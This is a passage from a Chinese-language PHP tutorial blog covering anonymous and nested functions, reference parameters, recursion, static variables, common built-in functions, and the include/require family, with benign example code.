class="comment">//把$fu的值改为test字符串再试试？</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>&emsp;<br>&emsp;</p>
<h4 id="1-4-匿名函数"><a href="#1-4-匿名函数" class="headerlink" title="1.4 匿名函数"></a><font color="#3CB371" face="Comic sans MS">1.4 匿名函数</font></h4><p><strong>匿名函数，也就是</strong><font color="red"><strong>没有函数名的函数。</strong></font></p>
<p>匿名函数的第一种用法，直接把赋数赋值给变量，调用变量即为调用函数。<br>匿名函数的写法比较灵活。</p>
<p><font color="#00B2EE"><strong>1.变量函数式的匿名函数</strong></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$greet</span> = <span class="keyword">function</span>(<span class="variable">$name</span>)</span><br><span class="line">&#123;</span><br><span class="line"> <span class="built_in">echo</span> <span class="variable">$name</span>.<span class="string">&#x27;，你好&#x27;</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="variable">$greet</span>(<span class="string">&#x27;明天&#x27;</span>);</span><br><span class="line"><span class="variable">$greet</span>(<span class="string">&#x27;PHP中文网&#x27;</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>上例中的函数体没有函数名，通过$greent加上括号来调用的，这就是匿名函数。</p>
</blockquote>
<p>&emsp;<br><font color="#00B2EE"><strong>2.回调式的匿名函数</strong></font><br>实际使用场景中，我们要通过一个函数实现更多的功能。但是，我又不想专门定义一个函数。我们回顾一下，我们回调函数的例子：</p>
<p><font face="Comic sans MS"></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">function</span> woziji(<span class="variable">$one</span>,<span class="variable">$two</span>,<span class="variable">$func</span>)&#123;</span><br><span class="line">       //我规定：检查<span class="variable">$func</span>是否是函数，如果不是函数停止执行本段代码，返回<span class="literal">false</span></span><br><span class="line">       <span class="keyword">if</span>(!is_callable(<span class="variable">$func</span>))&#123;</span><br><span class="line">               <span class="built_in">return</span> <span class="literal">false</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       //我把<span class="variable">$one</span>、<span class="variable">$two</span>相加，再把<span class="variable">$one</span>和<span class="variable">$two</span>传入<span class="variable">$func</span>这个函数中处理一次</span><br><span class="line">       //<span class="variable">$func</span>是一个变量函数，参见变量函数这一章</span><br><span class="line">       <span class="built_in">echo</span> <span class="variable">$one</span> + <span class="variable">$two</span> + <span class="variable">$func</span>(<span class="variable">$one</span>,<span class="variable">$two</span>);</span><br><span class="line">&#125;</span><br><span class="line">woziji(20,30,<span class="keyword">function</span>( <span class="variable">$foo</span> , <span class="variable">$bar</span>)&#123;</span><br><span class="line">               <span class="variable">$result</span> = (<span class="variable">$foo</span>+<span class="variable">$bar</span>)*2;</span><br><span class="line">               <span class="built_in">return</span> <span class="variable">$result</span>;</span><br><span class="line">           &#125;</span><br><span class="line">);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>&emsp;<br>仔细推理一下过程哟。只不过在之前的章节当中，plusx2换成了我们的匿名函数：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span>( <span class="variable">$foo</span> , <span class="variable">$bar</span>)&#123;</span><br><span class="line"></span><br><span class="line">       <span class="variable">$result</span> = (<span class="variable">$foo</span>+<span class="variable">$bar</span>)*2;</span><br><span class="line"></span><br><span class="line">       <span class="built_in">return</span> <span class="variable">$result</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>因此，函名函数在调用的时候没有函数名。我们可以采用以上的一些方法来使用匿名函数。</p>
</blockquote>
<p>&emsp;<br>&emsp;</p>
<h4 id="1-5-内部函数"><a href="#1-5-内部函数" class="headerlink" title="1.5 内部函数"></a><font color="#3CB371" face="Comic sans MS">1.5 内部函数</font></h4><p><strong>内部函数，是指</strong><font color="red"><strong>在函数内部又声明了一个函数。</strong></font></p>
<p><font face="Comic sans MS"><strong>注意事项：</strong></p>
<ol>
<li>内部函数名，不能是已存在的函数名</li>
<li>假设在函数a里面定义了一个内部函数，不能定用两次函数a。</font>

</li>
</ol>
<p>我们下面来看代码，你将很快的学习会：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">function</span> foo()</span><br><span class="line">&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;我是函数foo哟，调一下我才会执行定义函数bar的过程&lt;br /&gt;&#x27;</span>;</span><br><span class="line"> <span class="keyword">function</span> bar()</span><br><span class="line"> &#123;</span><br><span class="line">      <span class="built_in">echo</span> <span class="string">&#x27;在foo函数内部有个函数叫bar函数&lt;br /&gt;&#x27;</span>;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//现在还不能调用bar()函数，因为它还不存在</span><br><span class="line">//bar(); //如果现在调用会报错</span><br><span class="line">foo();</span><br><span class="line"></span><br><span class="line">//现在可以调用bar()函数了，因为foo()函数的执行使得bar()函数变为已定义的函数</span><br><span class="line">bar();</span><br><span class="line">//再调一次foo()看看是不是会报错？  会报错</span><br><span class="line">foo();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>仔细观察和实验后你会得出如下的结论：<br>   1.foo()调用两次会报错<br>   2.如果不调foo()函数无法执行bar函数，因为bar是在foo的内部</p>
</blockquote>
<p>&emsp;<br>&emsp;</p>
<h4 id="1-6-参数的引用"><a href="#1-6-参数的引用" class="headerlink" title="1.6 参数的引用"></a><font color="#3CB371" face="Comic sans MS">1.6 参数的引用</font></h4><p>在变量这个函数中，我们学习了变量的引用，我们来回顾一下知识：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$a = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">$b = &amp;$a;</span><br><span class="line"></span><br><span class="line">$a = <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $a.<span class="string">&#x27;---------&#x27;</span>.$b;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>上述知识点的在变量章节中，变量引用有讲述，是指变量$a和$b指向到了同一个存储位置，来存值。</p>
</blockquote>
<p>&emsp;<br><font color="#FF7F00"><strong>而函数的参数引用，也是这个意思，将形参和实参指向到同一个位置。如果形参在函数体内发生变化，那么实参的值也发生变化。我们来通过实验来看看：</strong></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="variable">$foo</span> = 100;</span><br><span class="line"></span><br><span class="line">//注意：在<span class="variable">$n</span>前面加上了&amp;符</span><br><span class="line"><span class="keyword">function</span> demo(&amp;<span class="variable">$n</span>)&#123;</span><br><span class="line"></span><br><span class="line">       <span class="variable">$n</span> = 10;</span><br><span class="line"></span><br><span class="line">       <span class="built_in">return</span> <span class="variable">$n</span> + <span class="variable">$n</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span>  demo(<span class="variable">$foo</span>).<span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">//你会发生<span class="variable">$foo</span>的值变为了10</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$foo</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>通过上例，我们发现实参为$foo，在调用demo的时候，<font color="red"><strong>让$foo和$n指向到了同一个存储区域</strong></font>，当$n的值发生变化的时候。那么$foo的值也发生变化。</p>
</blockquote>
<p>&emsp;<br>&emsp;</p>
<h4 id="1-7-递归函数"><a href="#1-7-递归函数" class="headerlink" title="1.7 递归函数"></a><font color="#3CB371" face="Comic sans MS">1.7 递归函数</font></h4><p>递归函数，递归只是一个名字，而递归函数的规定：<font color="red"><strong>函数体内调用函数自己</strong></font>。<br>递归在实际工作中主要是用在：<font color="red"><strong>文件和文件夹操作</strong></font>的时候有使用到。</p>
<p><font face="Comic sans MS"><font color="#00B2EE"><strong>几个思维上的盲区：</strong></font><br>  1.代码是从上到下执行的，所有代码没有exit等停止符，函数必须执行完。<br>  2.如果函数从函数A跳至函数B后，必须把函数B执行完成再执行函数A余下的代码。<br>  3.递归函数必须要能执行完有结束条件，不然函数就会限入死循环。函数会永远的自我执行下去。<br></font></p>
<p>我们来写一代码码来理解一下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$num</span> = 10;</span><br><span class="line">//调用一次函数A();</span><br><span class="line">A(<span class="variable">$num</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> A( <span class="variable">$arg</span> )&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="variable">$arg</span>;</span><br><span class="line">   //在函数A里面去，跑去执行函数B去了</span><br><span class="line">   B(<span class="variable">$arg</span>);</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;我们需要不断的努力，努力到上天都为我们感动&#x27;</span>;</span><br><span class="line">   <span class="built_in">echo</span> <span class="variable">$arg</span>.<span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> B( <span class="variable">$number</span> )&#123;</span><br><span class="line">       <span class="built_in">echo</span> <span class="variable">$number</span>;</span><br><span class="line">       <span class="built_in">echo</span> <span class="string">&#x27;俺是狗蛋，执行完了&lt;br /&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>结论：</strong><br>1.执行函数A到一半的时候，跑去执行了函数B<br>2.执行完函数B，先显示出来的是：“俺是狗蛋，执行完了”，接着显示的才是：“我们需要不断的努力，努力到上天都为我们感动”<br>3.也就是证明了我们所说思维盲区里面的内容，代码从上到下执行，代码必须执行完。</p>
</blockquote>
<p>&emsp;<br>  我们来写一个简单的递归代码,让函数自己调用自己。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$n = <span class="number">2</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">dg</span>(<span class="params"> $n </span>)</span>&#123;</span><br><span class="line">   <span class="keyword">echo</span> $n.<span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line">   $n = $n - <span class="number">1</span>;</span><br><span class="line">   <span class="keyword">if</span>($n &gt; <span class="number">0</span>)&#123;</span><br><span class="line">       <span class="comment">//在函数体内调用了dg自己哟</span></span><br><span class="line">       dg($n);</span><br><span class="line">   &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&#x27;--------------&#x27;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;俺是狗蛋，俺还没执行&#x27;</span> . $n . <span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>我们来仔细推理一次：<br>   1.第一次调用dg()，将数字$n = 2传到dg中，先显示出来了2<br>   2.然后将$n - 1 $n的值为了1<br>   3.接着判断$n 是否大于0,肯定是大于0的，所以调用递归自己，再把自己执行一次。<br>   4.而第二次在执行自己dg()的时候，而最下面的 echo ‘俺是狗蛋，俺还没执行’ . $n . ‘<br>‘; 还没有执行到。等待执行完成后再来执行<br>   5.$n此时等于1 ，所以显示出来1。<br>   6.$n把自己减了一次，$n的结果为0<br>   7.$n大于0肯定不成立的，所以显示了一条:”————–”<br>   8.而这个时候该执行：echo ‘俺是狗蛋，俺还没执行’ . $n . ‘<br>‘;<br>   9.第二次执行dg()执行完成。第一次dg()的代码还没执行完，将第4点中的余下代码执行完。</p>
</blockquote>
<p>&emsp;<br>&emsp;</p>
<h4 id="1-8-静态变量"><a href="#1-8-静态变量" class="headerlink" title="1.8 静态变量"></a><font color="#3CB371" face="Comic sans MS">1.8 静态变量</font></h4><p><font face="Comic sans MS"><font color="red"><strong>静态变量的特点是：</strong></font>声明一个静态变量，第二次调用函数的时候，静态变量不会再初始化变量，会在原值的基础上读取执行。<br>实际上:全局变量本身就是静态存储方式,<font color="red"><strong>所有的全局变量都是静态变量</strong></font><br></font></p>
<p><font color="#FF7F00"><strong>以下讲述局部静态变量和全局静态变量：</strong></font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//--------------如何理解static静态变量-----------</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/** 普通局部变量 */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">local</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"> $loc = <span class="number">0</span>; <span class="comment">//这样，如果直接不给初值0是错误的。</span></span><br><span class="line"> ++$loc;</span><br><span class="line"> <span class="keyword">echo</span> $loc . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">local(); <span class="comment">//1</span></span><br><span class="line">local(); <span class="comment">//1</span></span><br><span class="line">local(); <span class="comment">//1</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;===================================&lt;br/&gt;&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/** static静态局部变量 */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">static_local</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"> <span class="built_in">static</span> $local = <span class="number">0</span> ; <span class="comment">//此处可以不赋0值</span></span><br><span class="line"> $local++;</span><br><span class="line"> <span class="keyword">echo</span> $local . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">static_local(); <span class="comment">//1</span></span><br><span class="line">static_local(); <span class="comment">//2</span></span><br><span class="line">static_local(); <span class="comment">//3</span></span><br><span class="line"><span class="comment">//echo $local; 注意虽然静态变量，但是它仍然是局部的，在外不能直接访问的。</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;=======================================&lt;br&gt;&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/** static静态全局变量(实际上:全局变量本身就是静态存储方式,所有的全局变量都是静态变量) */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">static_global</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"> <span class="keyword">global</span> $glo; <span class="comment">//此处，可以不赋值0，当然赋值0，后每次调用时其值都为0，每次调用函数得到的值都会是1，</span></span><br><span class="line"> <span class="comment">//但是不能想当然的写上&quot;static&quot;加以修饰，那样是错误的.</span></span><br><span class="line"> $glo++;</span><br><span class="line"> <span class="keyword">echo</span> $glo . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">static_global(); <span class="comment">//1</span></span><br><span class="line">static_global(); <span class="comment">//2</span></span><br><span class="line">static_global(); <span class="comment">//3</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>&emsp;<br>&emsp;<br>&emsp;<br>&emsp;</p>
<h3 id="二-系统函数"><a href="#二-系统函数" class="headerlink" title="二. 系统函数"></a><font color="#FF6347" face="Comic sans MS">二. 系统函数</font></h3><h4 id="2-1-使用介绍"><a href="#2-1-使用介绍" class="headerlink" title="2.1 使用介绍"></a><font color="#3CB371" face="Comic sans MS">2.1 使用介绍</font></h4><p><font color="#00B2EE">[<a href="http://www.php.cn/">PHP手册下载</a>]</font></p>
<ol>
<li>如果代码能赚钱，帮你赚钱最多的是基本语法</li>
<li>如果你还在当程序员，你看手册的时间可能比你看老婆的时间还长</li>
</ol>
<p><font face="Comic sans MS">使用函数的重点是三块：<br>    1.了解函数的<font color="red">功能</font>，特别是常用函数的功能<br>    2.了解函数的<font color="red">参数</font><br>    3.了解函数的<font color="red">返回值</font><br></font></p>
<blockquote>
<p>我们针对上面的三块，讲解6个函数，这6个函数，概况了函数的基本用法的全部注意事项：<br><font color="#00B2EE"><strong>1. 直接返回布尔型，如bool copy ()<br>2. 带有MIXED参数的函数如何调用。Mixed表示任何类型的数据。如Array_unshift()<br>3. 参数中带有&amp;符的参数，一定要传一个变量做为参数。函数里面改变了他的值。<br>4. 带有[]的参数，表示可选项。<br>5. 带有…的参数，表示可以传任意多个参数。<br>6. 带有callback的参数，表示回调函数。需要传一个函数进来。Array_map()<br>7. 函数支持的版本要了解。</strong><br></font></p>
</blockquote>
<p>&emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>1. 直接返回布尔型</strong></font><br><font color="red"><strong>bool</strong></font> <strong>copy ( string $source , string $dest [, resource $context ] )</strong><br></font></p>
<blockquote>
<p><strong>这个函数的功能为：</strong> 拷备一个文件<br><strong>返回值为为：</strong> bool型值，就是成功返回true，失败返回false<br><strong>参数为：</strong> 两个字符串的值，一个是copy的源文件，一个为目标文件。第三个参数可选的，不常用，我们不管它。</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(copy(<span class="string">&#x27;abc.txt&#x27;</span>,<span class="string">&#x27;bcd.txt&#x27;</span>))&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;复制成功&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;复制失败&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>&emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>2. Mixed表示任何类型的数据。如Array_unshift()</strong></font> </font><br><font color="red"><strong>int</strong></font> array_unshift ( array &amp;$array , <font color="red"><strong>mixed</strong></font>  $value1 [, mixed $… ] )</p>
<p><font face="Comic sans MS"></font></p>
<blockquote>
<p><strong>功能：</strong> 操作一个数组，向数组中之前插入其他类型的参数。<br><strong>返回值：</strong> <font color="#FF7F00"><strong>int 类型</strong></font>，可能就是插入成功最后的个数<br><strong>参数：</strong> <font color="#FF7F00"><br><strong>第一个参数为&amp;符</strong></font>，也就是在操作的过程中，改变了第一个参数的值。引用传参。也就是操作这个数组，向这个数组中传入参数。会直接改变这个数组的值。<font color="#FF7F00"><br><strong>第二个参数为mixed</strong></font>，因为数组可以存入多个不同的类型.mixed是指混合的意思。因此，mixed是指可传入任意类型<font color="#FF7F00"><br><strong>第三个数数加了中括号[ ]</strong></font>，我们所有遇到中括号的。都是指后面的参数可传，也可以不传。<br>第四，最后还看到了三个…(省略号)。代表可以传入任意多个参数。</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$queue</span> = array(<span class="string">&quot;凤姐&quot;</span>, <span class="string">&quot;芙蓉&quot;</span>);</span><br><span class="line">array_unshift(<span class="variable">$queue</span>, <span class="string">&quot;杨幂&quot;</span>, <span class="string">&quot;姚晨&quot;</span>);</span><br><span class="line">print_r(<span class="variable">$queue</span>);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">Array ( [0] =&gt; 杨幂 [1] =&gt; 姚晨 [2] =&gt; 凤姐 [3] =&gt; 芙蓉 )</span><br></pre></td></tr></table></figure>

<p>&emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>3. 遇到callback的传函数或者匿名函数进去协助处理，让功能更强大。</strong></font><br></font><br>bool array_walk ( array &amp;$array , <font color="red"><strong>callable</strong></font> $callback [, mixed $userdata = NULL ] )</p>
<p><font face="Comic sans MS"></font></p>
<blockquote>
<p><font color="#FF7F00"><strong>功能：</strong></font><br>传入一个回调函数，将数组的原来的组操作，并且发生变化。<font color="#FF7F00"><br><strong>返回值：</strong></font><br>bool 值 也就是意味着，提示成功或者失败<font color="#FF7F00"><br><strong>参数：</strong></font><br>第一个参数是要操作的数组。<br>第二个参数是callback 代表着可以传入函数或者匿名函数。</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$shuaige</span> = array(<span class="string">&quot;a&quot;</span> =&gt; <span class="string">&quot;wuyanzhu&quot;</span>, <span class="string">&quot;b&quot;</span> =&gt; <span class="string">&quot;huangxiaoming&quot;</span>, <span class="string">&quot;c&quot;</span> =&gt; <span class="string">&quot;ninzetao&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> test_print(<span class="variable">$item2</span>, <span class="variable">$key</span>)</span><br><span class="line">&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="variable">$key</span> .<span class="string">&quot; ---&quot;</span>. strtoupper(<span class="variable">$item2</span>) . <span class="string">&quot;&lt;br /&gt;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">var_dump(<span class="variable">$shuaige</span>);</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">array_walk(<span class="variable">$shuaige</span>, <span class="string">&#x27;test_print&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;用自定义函数test_print执行后的效果：&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">var_dump(<span class="variable">$shuaige</span>);</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">array(3) &#123;</span><br><span class="line">  [<span class="string">&quot;a&quot;</span>]=&gt;</span><br><span class="line">  string(8) <span class="string">&quot;wuyanzhu&quot;</span></span><br><span class="line">  [<span class="string">&quot;b&quot;</span>]=&gt;</span><br><span class="line">  string(13) <span class="string">&quot;huangxiaoming&quot;</span></span><br><span class="line">  [<span class="string">&quot;c&quot;</span>]=&gt;</span><br><span class="line">  string(8) <span class="string">&quot;ninzetao&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">a ---WUYANZHU</span><br><span class="line">b ---HUANGXIAOMING</span><br><span class="line">c ---NINZETAO</span><br><span class="line">用自定义函数test_print执行后的效果：</span><br><span class="line">array(3) &#123;</span><br><span class="line">  [<span class="string">&quot;a&quot;</span>]=&gt;</span><br><span class="line">  string(8) <span class="string">&quot;wuyanzhu&quot;</span></span><br><span class="line">  [<span class="string">&quot;b&quot;</span>]=&gt;</span><br><span class="line">  string(13) <span class="string">&quot;huangxiaoming&quot;</span></span><br><span class="line">  [<span class="string">&quot;c&quot;</span>]=&gt;</span><br><span class="line">  string(8) <span class="string">&quot;ninzetao&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>通过上例，我们发现数组中的每个参数和值都被修改了。上例大家只需要理解看见传callback的，需要传入函数协助处理就可以。不用理解。我们在下一章的数组部份，学习完数组，大家可以再看看。<br>函数支持的版本号很重要。</p>
</blockquote>
<p>&emsp;<br>&emsp;</p>
<h4 id="2-2-文件包含函数"><a href="#2-2-文件包含函数" class="headerlink" title="2.2 文件包含函数"></a><font color="#3CB371" face="Comic sans MS">2.2 文件包含函数</font></h4><p><font face="Comic sans MS">在实际开发中，常常需要把程序中的公用代码放到一个文件中，使用这些代码的文件只需要包含这个文件即可。这种方法有助于提高代码的重用性，给代码的编写与维护带来很大的便利。在PHP中， 有<br><font color="#00B2EE"><strong>include</strong></font><br><font color="#00B2EE"><strong>include_once</strong></font><br><font color="#00B2EE"><strong>require</strong></font><br><font color="#00B2EE"><strong>require_once</strong></font><br>四种方法包含一个文件。<br></font></p>
<table>
<thead>
<tr>
<th align="center">函数</th>
<th align="center">包含失败</th>
<th align="left">特点</th>
</tr>
</thead>
<tbody><tr>
<td align="center">Inlcude</td>
<td align="center">返回一条警告</td>
<td align="left">文件继续向下执行。通常用于动态包含</td>
</tr>
<tr>
<td align="center">Require</td>
<td align="center">一个致命的错</td>
<td align="left">代码就不会继续向下执行。通常包含极为重要的文件，整个代码甭想执行</td>
</tr>
<tr>
<td align="center">Include_once</td>
<td align="center">返回一条警告</td>
<td align="left">除了原有include的功能以外，它还会做once检测，如果文件曾经已经被被包含过，不再包含</td>
</tr>
<tr>
<td align="center">Require_once</td>
<td align="center">一个致命的错</td>
<td align="left">除了原的功能一外，会做一次once</td>
</tr>
</tbody></table>
<p>&emsp;</p>
<table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS"><font color="red">**注意：**</font>
1，少用_once带once，因为它会消耗更多的资源去做检测的工作。
2，特高级
Include文件只需要编译一次，因为每次包含include都会再执行一次对应的代码，如何减少include再次执行
时，需要重新解析的过程。
</font></td></tr></table>

<p>&emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>1. include包含函数的功能。</strong></font><br></font><br>创建一个functions.php文件，里面写上两个函数：<font color="#FF6347">(1)↓↓</font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//functions.php文件</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">demo</span></span>()&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;aaaa&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">test</span></span>()&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;cccdddd&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>&emsp;<br>在functions.php的同级目录下，我再创建一个user.php文件把functions.php文件包含进来。这样我的函数就可以专门放在functions.php里面，哪儿需要用到这些函数的时候，我就从哪儿包含进来：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">//user.php</span><br><span class="line"></span><br><span class="line">include <span class="string">&#x27;functions.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">//可以直接调用</span><br><span class="line">demo();</span><br><span class="line"></span><br><span class="line"><span class="built_in">test</span>();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>&emsp;<br><strong>接下来我们对比include和require：</strong><font color="#FF6347">(2)↓↓</font><br>代码中，我们先用include来<strong>包含不存在</strong>的test.php文件，</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">//user.php</span><br><span class="line"></span><br><span class="line">include <span class="string">&#x27;functions.php&#x27;</span>;</span><br><span class="line">include <span class="string">&#x27;test.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">//可以直接调用</span><br><span class="line">demo();</span><br><span class="line"></span><br><span class="line"><span class="built_in">test</span>();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>再用require包含 不存在的test.php文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">//user.php</span><br><span class="line"></span><br><span class="line">include <span class="string">&#x27;functions.php&#x27;</span>;</span><br><span class="line">require <span class="string">&#x27;test.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">//可以直接调用</span><br><span class="line">demo();</span><br><span class="line"></span><br><span class="line"><span class="built_in">test</span>();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><font color="#FF6347"><strong>通过上例的对比我们发现：</strong></font><br>(1) 如果test.php文件不存在include 会发出警告继续执行demo()和test()函数。<br>(2) 而requre则直接报错，demo()和test()函数无法继续执行。</p>
</blockquote>
<p>&emsp;<br>我们通过表格知道了:<strong>inlcude</strong> 和<strong>include_once</strong>的区别在于，<font color="#00B2EE"><strong>检测是否重复包含。</strong></font><font color="red"><strong>如果重复包含了include_once不会再包含 对应的文件了，而include 则不管这些。有没引入过文件，都再引入一次。</strong></font>include使用两次会报错，而include_once不会报错！</p>
<p>同样刚刚的user.php我们再实验一下,我们将functions.php包含两次，分别使用<strong>include</strong>和<strong>include_once</strong>：<font color="#FF6347">(3)↓↓</font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">//user.php</span><br><span class="line"></span><br><span class="line">//这儿被包含了两次同样的函数定义文件哟</span><br><span class="line">include <span class="string">&#x27;functions.php&#x27;</span>;</span><br><span class="line">include <span class="string">&#x27;functions.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">//可以直接调用</span><br><span class="line">demo();</span><br><span class="line"></span><br><span class="line"><span class="built_in">test</span>();</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">运行后系统会报错！！！</span><br></pre></td></tr></table></figure>

<p>改为<strong>include_once</strong>再试一次：</p>
